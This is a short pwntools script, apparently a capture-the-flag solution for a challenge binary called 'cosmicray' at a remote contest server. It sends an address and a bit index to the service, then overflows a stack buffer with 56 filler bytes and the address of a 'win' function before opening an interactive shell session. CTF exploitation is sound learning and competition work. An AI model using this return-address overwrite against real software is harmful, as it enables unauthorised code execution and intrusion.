from pwn import *

context.binary = exe = ELF('./cosmicray')

# io = process()
# gdb.attach(io, api=True)
io = remote('chals.sekai.team', 4077)

io.recvuntil(b'it:\n')
io.sendline(b'0x404028')
io.recvuntil(b'):\n')
io.sendline(b'2')
io.recvuntil(b'today:\n')

payload = b'i'*56 + p64(exe.sym['win'])
io.sendline(payload)
io.interactive()
